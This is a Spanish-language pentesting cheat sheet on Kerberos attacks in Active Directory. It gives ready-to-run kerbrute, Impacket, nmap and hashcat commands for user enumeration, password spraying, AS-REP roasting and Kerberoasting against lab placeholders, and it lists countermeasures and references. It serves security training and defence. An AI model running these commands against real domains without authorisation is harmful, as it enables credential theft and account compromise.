# Enumeración Kerberos (Puerto 88)

## Descripción
Kerberos es el protocolo de autenticación por defecto en entornos de Active Directory (AD). Funciona mediante el intercambio de "tickets" emitidos por el Key Distribution Center (KDC). La enumeración de Kerberos permite identificar usuarios válidos del dominio sin causar bloqueos de cuenta (pre-authentication), descubrir servicios mediante sus SPN (Service Principal Names) para ataques de Kerberoasting, y extraer hashes de usuarios que no requieren pre-autenticación (AS-REP Roasting).

## Clasificación
- **Fase**: Enumeración / Post-explotación
- **MITRE ATT&CK**: 
    - T1558 (Steal or Forge Kerberos Tickets)
    - T1558.003 (Steal or Forge Kerberos Tickets: Kerberoasting)
    - T1558.004 (Steal or Forge Kerberos Tickets: AS-REP Roasting)
- **Plataforma**: Windows
- **Dificultad**: Intermedia

## Herramientas
- **kerbrute** — herramienta rápida para enumerar usuarios y fuerza bruta vía Kerberos pre-auth
- **Impacket (GetNPUsers.py)** — extrae hashes AS-REP para usuarios sin pre-autenticación requerida
- **Impacket (GetUserSPNs.py)** — realiza Kerberoasting para identificar y extraer hashes de servicios
- **nmap** — scripts NSE para detección de servicios y enumeración básica
- **Rubeus** — herramienta de post-explotación en C# para interacción avanzada con Kerberos

## Comandos / Ejemplos

### Enumeración de usuarios con Kerbrute
```bash
# Enumerar usuarios válidos desde una lista (sin bloquear cuentas)
kerbrute userenum --dc 10.10.10.10 -d corp.local /usr/share/wordlists/seclists/Usernames/Names/names.txt

# Fuerza bruta de contraseñas (Password Spraying)
kerbrute passwordspray -d corp.local --dc 10.10.10.10 usernames.txt Password123
```

### AS-REP Roasting (Usuarios sin pre-autenticación)
```bash
# GetNPUsers de Impacket para obtener hashes crackeables de usuarios sin pre-auth
impacket-GetNPUsers corp.local/ -usersfile usuarios.txt -format hashcat -outputfile asrep_hashes.txt -dc-ip 10.10.10.10

# Crackeo del hash obtenido
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

### Kerberoasting (Extracción de hashes de servicios)
```bash
# GetUserSPNs de Impacket para listar SPNs y solicitar tickets TGS (hashes crackeables)
impacket-GetUserSPNs corp.local/username:password -dc-ip 10.10.10.10 -request

# Exportar a formato hashcat
impacket-GetUserSPNs corp.local/username:password -dc-ip 10.10.10.10 -request -outputfile krb_hashes.txt

# Crackeo del hash TGS (Service Ticket)
hashcat -m 13100 krb_hashes.txt /usr/share/wordlists/rockyou.txt
```

### Escaneo con Nmap
```bash
# Identificar si el puerto 88 está abierto y obtener info básica
nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='CORP.LOCAL',userdb=/usr/share/wordlists/seclists/Usernames/Names/names.txt 10.10.10.10
```

## Contramedidas
- **Deshabilitar "Do not require Kerberos preauthentication"** en todas las cuentas de usuario.
- **Utilizar contraseñas robustas y largas** (más de 25 caracteres) para cuentas de servicio para mitigar Kerberoasting.
- **Implementar Managed Service Accounts (gMSA)** que gestionan automáticamente contraseñas complejas.
- **Monitorear eventos de Kerberos** (ID 4768 - TGT solicitado, ID 4769 - TGS solicitado) para detectar anomalías o patrones de fuerza bruta.
- **Limitar privilegios de las cuentas de servicio** al mínimo necesario (Principio de Menor Privilegio).

## Referencias
- Impacket Suite. (2024). SecureAuthCorp/impacket. GitHub.
- Kerbrute. (2024). ropnop/kerbrute. GitHub.
- MITRE Corporation. (2024). ATT&CK Technique T1558: Steal or Forge Kerberos Tickets. https://attack.mitre.org/techniques/T1558/
- SecLists: /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
- Allen, M. (2022). *Mastering Kali Linux for Advanced Penetration Testing* (4th ed.). Packt Publishing.
- Harper, A., Linn, R., Sims, S., & Baucom, M. (2018). *Gray Hat Hacking: The Ethical Hacker's Handbook* (5th ed.). McGraw-Hill Education.
